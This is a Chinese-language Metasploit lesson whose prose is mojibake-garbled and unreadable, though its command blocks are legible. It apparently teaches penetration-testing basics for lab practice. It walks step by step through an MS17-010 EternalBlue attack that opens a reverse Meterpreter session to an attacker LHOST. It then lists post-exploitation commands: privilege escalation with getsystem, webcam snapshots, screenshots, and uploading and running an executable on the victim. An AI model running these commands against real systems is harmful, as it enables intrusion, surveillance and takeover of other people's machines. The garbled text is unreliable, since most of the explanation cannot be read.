![](img/6bea3ceee54c62aef97063025f7c581f_0.png)

# è¯¾ç¨‹P50ï¼šç¬¬14å¤©ï¼šMetasploitæ¸—é€åŸºç¡€åŠå®æ“ ğŸ”§

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ æ¸—é€æµ‹è¯•æ¡†æ¶Metasploitçš„åŸºç¡€çŸ¥è¯†ï¼ŒåŒ…æ‹¬å…¶ç›®å½•ç»“æ„ã€æ ¸å¿ƒæ¨¡å—ã€åŸºæœ¬æ“ä½œæµç¨‹ï¼Œå¹¶é€šè¿‡ç»å…¸çš„MS17-010ï¼ˆæ°¸æ’ä¹‹è“ï¼‰æ¼æ´æ”»å‡»å®ä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•åˆ©ç”¨Metasploitè·å–ç›®æ ‡ä¸»æœºçš„Meterpreterä¼šè¯ï¼Œå¹¶è¿›è¡Œåˆæ­¥çš„åæ¸—é€æ“ä½œã€‚

---

## æ¦‚è¿° ğŸ“–

![](img/6bea3ceee54c62aef97063025f7c581f_2.png)

![](img/6bea3ceee54c62aef97063025f7c581f_3.png)

Metasploitæ˜¯ä¸€ä¸ªé«˜åº¦æ¨¡å—åŒ–çš„å¼€æºæ¸—é€æµ‹è¯•æ¡†æ¶ï¼Œå®ƒé›†æˆäº†å¤§é‡å·²çŸ¥æ¼æ´çš„åˆ©ç”¨è„šæœ¬ï¼ˆExploitï¼‰ã€æ”»å‡»è½½è·ï¼ˆPayloadï¼‰ä»¥åŠè¾…åŠ©å·¥å…·ã€‚ä½¿ç”¨Metasploitï¼Œæµ‹è¯•è€…å¯ä»¥è‡ªåŠ¨åŒ–æ‰§è¡Œå¤æ‚çš„æ”»å‡»æµç¨‹ï¼Œä¾‹å¦‚æ¼æ´æ‰«æã€åˆ©ç”¨ã€æƒé™æå‡å’ŒæŒä¹…åŒ–æ§åˆ¶ï¼Œè€Œæ— éœ€æ·±å…¥ç†è§£æ¯ä¸ªæ¼æ´çš„åº•å±‚ç»†èŠ‚æˆ–æ‰‹åŠ¨ç¼–å†™åˆ©ç”¨ä»£ç ã€‚æœ¬èŠ‚è¯¾æ—¨åœ¨å¸®åŠ©åˆå­¦è€…ç†è§£Metasploitçš„åŸºæœ¬æ¶æ„å’Œä½¿ç”¨æ–¹æ³•ã€‚

---

![](img/6bea3ceee54c62aef97063025f7c581f_5.png)

![](img/6bea3ceee54c62aef97063025f7c581f_7.png)

## Metasploitç®€ä»‹ä¸å®‰è£… ğŸ› ï¸

Metasploitï¼ˆç®€ç§°MSFï¼‰æ˜¯æœ€å—æ¬¢è¿çš„æ¸—é€æµ‹è¯•å·¥å…·ä¹‹ä¸€ã€‚åœ¨Kali Linuxä¸­é€šå¸¸é¢„è£…ï¼Œå…¶å®‰è£…è·¯å¾„ä¸€èˆ¬ä¸º `/usr/share/metasploit-framework/`ã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_9.png)

**æŸ¥çœ‹ç‰ˆæœ¬ä¸æ›´æ–°ï¼š**
```bash
msfconsole -v
```
è‹¥éœ€æ›´æ–°ï¼Œå¯å…ˆæ›´æ–°APTæºï¼Œç„¶åæ‰§è¡Œå®‰è£…å‘½ä»¤ï¼š
```bash
apt-get update
apt-get install metasploit-framework
```
ä¹Ÿå¯ä»¥ä»GitHubå®˜æ–¹ä»“åº“å•ç‹¬ä¸‹è½½æ›´æ–°çš„æ¨¡å—æ–‡ä»¶ï¼Œæ”¾å…¥å¯¹åº”çš„ `modules` ç›®å½•ã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_11.png)

![](img/6bea3ceee54c62aef97063025f7c581f_13.png)

![](img/6bea3ceee54c62aef97063025f7c581f_15.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_17.png)

![](img/6bea3ceee54c62aef97063025f7c581f_19.png)

## ç›®å½•ç»“æ„è§£æ ğŸ“

![](img/6bea3ceee54c62aef97063025f7c581f_21.png)

![](img/6bea3ceee54c62aef97063025f7c581f_23.png)

äº†è§£Metasploitçš„ç›®å½•ç»“æ„æœ‰åŠ©äºæˆ‘ä»¬æ›´å¥½åœ°ä½¿ç”¨å®ƒã€‚æ ¸å¿ƒç›®å½•å¦‚ä¸‹ï¼š

![](img/6bea3ceee54c62aef97063025f7c581f_25.png)

ä»¥ä¸‹æ˜¯å„ä¸»è¦ç›®å½•åŠå…¶åŠŸèƒ½çš„ç®€è¦è¯´æ˜ï¼š

![](img/6bea3ceee54c62aef97063025f7c581f_27.png)

![](img/6bea3ceee54c62aef97063025f7c581f_29.png)

*   **data**: å­˜å‚¨äºŒè¿›åˆ¶æ–‡ä»¶ã€å¯ç¼–è¾‘æ–‡ä»¶ç­‰æ•°æ®ã€‚
*   **documentation**: å­˜æ”¾æ¡†æ¶çš„æ–‡æ¡£ã€‚
*   **lib**: æ ¸å¿ƒåº“æ–‡ä»¶ã€‚
*   **plugins**: æ’ä»¶ç›®å½•ã€‚
*   **scripts**: è„šæœ¬ç›®å½•ã€‚
*   **tools**: åŒ…å«å„ç§ç‹¬ç«‹å·¥å…·ã€‚
*   **modules**: **æœ€é‡è¦çš„ç›®å½•**ï¼ŒåŒ…å«æ‰€æœ‰åŠŸèƒ½æ¨¡å—ã€‚

---

![](img/6bea3ceee54c62aef97063025f7c581f_31.png)

### æ ¸å¿ƒæ¨¡å—ç›®å½•ï¼ˆmodulesï¼‰

![](img/6bea3ceee54c62aef97063025f7c581f_33.png)

![](img/6bea3ceee54c62aef97063025f7c581f_35.png)

`modules` ç›®å½•ä¸‹åŒ…å«ä¸ƒä¸ªå­ç›®å½•ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒçš„åŠŸèƒ½ï¼š

![](img/6bea3ceee54c62aef97063025f7c581f_37.png)

ä»¥ä¸‹æ˜¯å„æ¨¡å—ç±»å‹çš„è¯¦ç»†è¯´æ˜ï¼š

*   **auxiliaryï¼ˆè¾…åŠ©æ¨¡å—ï¼‰**: ç”¨äºä¿¡æ¯æ”¶é›†ã€æ¼æ´æ‰«æã€å¯†ç çˆ†ç ´ç­‰è¾…åŠ©æ€§ä»»åŠ¡ã€‚
*   **exploitsï¼ˆæ¼æ´åˆ©ç”¨æ¨¡å—ï¼‰**: åŒ…å«é’ˆå¯¹å„ç§ç³»ç»Ÿå’Œåº”ç”¨æ¼æ´çš„åˆ©ç”¨è„šæœ¬ã€‚
*   **payloadsï¼ˆæ”»å‡»è½½è·æ¨¡å—ï¼‰**: å®šä¹‰æ”»å‡»æˆåŠŸåå¸Œæœ›åœ¨ç›®æ ‡ç³»ç»Ÿæ‰§è¡Œçš„ä»£ç ï¼Œå¦‚åå¼¹Shellã€‚
*   **postï¼ˆåæ¸—é€æ¨¡å—ï¼‰**: åœ¨è·å–ç›®æ ‡ç³»ç»Ÿè®¿é—®æƒé™åï¼Œç”¨äºè¿›è¡Œæƒé™æå‡ã€å†…ç½‘æ¢æµ‹ã€ä¿¡æ¯æœé›†ç­‰åç»­æ“ä½œã€‚
*   **encodersï¼ˆç¼–ç å™¨æ¨¡å—ï¼‰**: å¯¹Payloadè¿›è¡Œç¼–ç ï¼Œä»¥ç»•è¿‡æ€æ¯’è½¯ä»¶ï¼ˆAVï¼‰æˆ–å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰çš„æ£€æµ‹ã€‚
*   **nopsï¼ˆç©ºæŒ‡ä»¤æ¨¡å—ï¼‰**: ç”Ÿæˆç©ºæŒ‡ä»¤ï¼ˆNOP sledï¼‰ï¼Œç”¨äºæé«˜æ¼æ´åˆ©ç”¨çš„ç¨³å®šæ€§ã€‚
*   **evasionï¼ˆè§„é¿æ¨¡å—ï¼‰**: ç”Ÿæˆå…æ€ï¼ˆAntivirus Evasionï¼‰çš„Payloadã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_39.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_41.png)

## å¯åŠ¨ä¸åŸºç¡€æ“ä½œ âš™ï¸

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†Metasploitçš„ç›®å½•ç»“æ„ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•å¯åŠ¨å®ƒå¹¶è¿›è¡ŒåŸºç¡€æ“ä½œã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_43.png)

**å¯åŠ¨ä¸æ•°æ®åº“åˆå§‹åŒ–ï¼š**
```bash
# åˆå§‹åŒ–æ•°æ®åº“ï¼ˆå¯é€‰ï¼Œä½†ä¾¿äºä¿å­˜æ‰«æç»“æœï¼‰
msfdb init
# å¯åŠ¨MSFæ§åˆ¶å°
msfconsole
```
å¯åŠ¨åï¼Œå¯ä»¥ä½¿ç”¨ `db_status` å‘½ä»¤æ£€æŸ¥æ•°æ®åº“è¿æ¥ï¼Œä½¿ç”¨ `workspace` å‘½ä»¤ç®¡ç†å·¥ä½œåŒºã€‚

**ä¿¡æ¯æ”¶é›†ç¤ºä¾‹ï¼š**
åœ¨MSFconsoleä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨é›†æˆçš„Nmapè¿›è¡Œæ‰«æï¼Œç»“æœä¼šè‡ªåŠ¨å­˜å…¥æ•°æ®åº“ã€‚
```bash
db_nmap -sS 192.168.1.0/24
```
ä¹Ÿå¯ä»¥ä½¿ç”¨è¾…åŠ©æ¨¡å—è¿›è¡Œæ‰«æï¼Œä¾‹å¦‚ä½¿ç”¨SYNåŠå¼€æ‰«æï¼š
```bash
use auxiliary/scanner/portscan/syn
show options
set RHOSTS 192.168.1.100
set THREADS 20
run
```

![](img/6bea3ceee54c62aef97063025f7c581f_45.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_47.png)

![](img/6bea3ceee54c62aef97063025f7c581f_49.png)

![](img/6bea3ceee54c62aef97063025f7c581f_51.png)

## å®æˆ˜ï¼šåˆ©ç”¨MS17-010æ¼æ´æ”»å‡» ğŸ¯

æˆ‘ä»¬ä»¥ç»å…¸çš„â€œæ°¸æ’ä¹‹è“â€ï¼ˆMS17-010ï¼‰æ¼æ´ä¸ºä¾‹ï¼Œæ¼”ç¤ºå®Œæ•´çš„Metasploitæ”»å‡»æµç¨‹ã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_53.png)

**ç¬¬ä¸€æ­¥ï¼šæœç´¢å¹¶æ£€æµ‹æ¼æ´**
```bash
search ms17-010
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.2.131
run
```
å¦‚æœç›®æ ‡å­˜åœ¨æ¼æ´ï¼Œæ¨¡å—ä¼šæç¤º `Host is likely VULNERABLE to MS17-010!`ã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_55.png)

![](img/6bea3ceee54c62aef97063025f7c581f_57.png)

**ç¬¬äºŒæ­¥ï¼šé€‰æ‹©åˆ©ç”¨æ¨¡å—å¹¶è®¾ç½®å‚æ•°**
```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
# è®¾ç½®ç›®æ ‡IP
set RHOST 192.168.2.131
# è®¾ç½®ç›‘å¬IPï¼ˆæ”»å‡»æœºIPï¼‰å’Œç«¯å£
set LHOST 192.168.2.128
set LPORT 4444
```
**ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œæ”»å‡»**
```bash
exploit
```
æ”»å‡»æˆåŠŸåï¼Œä¼šå¾—åˆ°ä¸€ä¸ª **Meterpreter** ä¼šè¯ã€‚Meterpreteræ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„åæ¸—é€å·¥å…·ã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_59.png)

![](img/6bea3ceee54c62aef97063025f7c581f_61.png)

![](img/6bea3ceee54c62aef97063025f7c581f_63.png)

---

![](img/6bea3ceee54c62aef97063025f7c581f_65.png)

## Meterpreteråæ¸—é€åŸºç¡€ ğŸ•µï¸â™‚ï¸

æˆåŠŸè·å–Meterpreterä¼šè¯æ˜¯æ¸—é€æµ‹è¯•çš„å…³é”®ä¸€æ­¥ã€‚åœ¨Meterpreterä¸­ï¼Œè¾“å…¥ `?` æˆ– `help` å¯ä»¥æŸ¥çœ‹æ‰€æœ‰å¯ç”¨å‘½ä»¤ã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_67.png)

**å¸¸ç”¨Meterpreterå‘½ä»¤åˆ†ç±»ï¼š**

![](img/6bea3ceee54c62aef97063025f7c581f_69.png)

![](img/6bea3ceee54c62aef97063025f7c581f_71.png)

ä»¥ä¸‹æ˜¯éƒ¨åˆ†æ ¸å¿ƒåŠŸèƒ½çš„å‘½ä»¤ç¤ºä¾‹ï¼š

![](img/6bea3ceee54c62aef97063025f7c581f_73.png)

![](img/6bea3ceee54c62aef97063025f7c581f_75.png)

*   **ä¼šè¯ç®¡ç†**: `background`ï¼ˆä¼šè¯æ”¾åˆ°åå°ï¼‰ï¼Œ `sessions -i <ID>`ï¼ˆé‡æ–°è¿›å…¥ä¼šè¯ï¼‰ã€‚
*   **ç³»ç»Ÿå‘½ä»¤**: `sysinfo`ï¼ˆæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ï¼‰ï¼Œ `getuid`ï¼ˆæŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™ï¼‰ã€‚
*   **æ–‡ä»¶ç³»ç»Ÿ**: `ls`, `cd`, `download`, `upload`ã€‚
*   **æƒé™æå‡**: `getsystem`ã€‚
*   **ç½‘ç»œå‘½ä»¤**: `ipconfig`, `portfwd`ï¼ˆç«¯å£è½¬å‘ï¼‰ã€‚
*   **æ‘„åƒå¤´/æˆªå±**: `webcam_list`, `webcam_snap`, `screenshot`ã€‚
*   **è·å–Shell**: `shell`ï¼ˆè¿›å…¥ç›®æ ‡ç³»ç»Ÿçš„CMDï¼‰ã€‚

**ç¤ºä¾‹ï¼šæ–‡ä»¶ä¸Šä¼ ä¸æ‰§è¡Œ**
```bash
# å°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡Cç›˜
upload /path/to/local/exp.exe C:\\
# è¿›å…¥ç›®æ ‡ç³»ç»Ÿçš„Shell
shell
# åœ¨Shellä¸­æ‰§è¡Œä¸Šä¼ çš„ç¨‹åº
C:\\exp.exe
```

![](img/6bea3ceee54c62aef97063025f7c581f_77.png)

---

## æ€»ç»“ ğŸ“

![](img/6bea3ceee54c62aef97063025f7c581f_79.png)

![](img/6bea3ceee54c62aef97063025f7c581f_81.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†Metasploitæ¸—é€æµ‹è¯•æ¡†æ¶çš„åŸºç¡€çŸ¥è¯†ã€‚æˆ‘ä»¬ä»æ¡†æ¶çš„ç®€ä»‹å’Œç›®å½•ç»“æ„å¼€å§‹ï¼Œäº†è§£äº†å…¶æ ¸å¿ƒæ¨¡å—çš„ç»„æˆã€‚éšåï¼Œæˆ‘ä»¬å­¦ä¹ äº†å¦‚ä½•å¯åŠ¨MSFconsoleå¹¶è¿›è¡ŒåŸºæœ¬çš„ä¿¡æ¯æ”¶é›†æ“ä½œã€‚æœ€åï¼Œé€šè¿‡ä¸€ä¸ªå®Œæ•´çš„MS17-010æ¼æ´æ”»å‡»å®ä¾‹ï¼Œæˆ‘ä»¬å®è·µäº†ä»æ¼æ´æ‰«æã€åˆ©ç”¨åˆ°è·å–Meterpreterä¼šè¯ï¼Œå¹¶è¿›è¡Œç®€å•åæ¸—é€æ“ä½œçš„å®Œæ•´æµç¨‹ã€‚

![](img/6bea3ceee54c62aef97063025f7c581f_83.png)

![](img/6bea3ceee54c62aef97063025f7c581f_85.png)

è®°ä½ï¼ŒMetasploitåŠŸèƒ½æå…¶ä¸°å¯Œï¼Œæœ¬èŠ‚è¯¾ä»…è§¦åŠå†°å±±ä¸€è§’ã€‚è¦ç†Ÿç»ƒæŒæ¡ï¼Œå¿…é¡»å‹¤åŠ ç»ƒä¹ ï¼Œåœ¨å®é™…æ“ä½œä¸­é‡åˆ°é—®é¢˜å¹¶è§£å†³ï¼Œæ‰èƒ½çœŸæ­£æå‡æŠ€èƒ½ã€‚è¯¾åè¯·åŠ¡å¿…åœ¨å®éªŒç¯å¢ƒä¸­å¤ç°æ•´ä¸ªæµç¨‹ï¼Œå¹¶å°è¯•æ¢ç´¢Meterpreterçš„æ›´å¤šåŠŸèƒ½ã€‚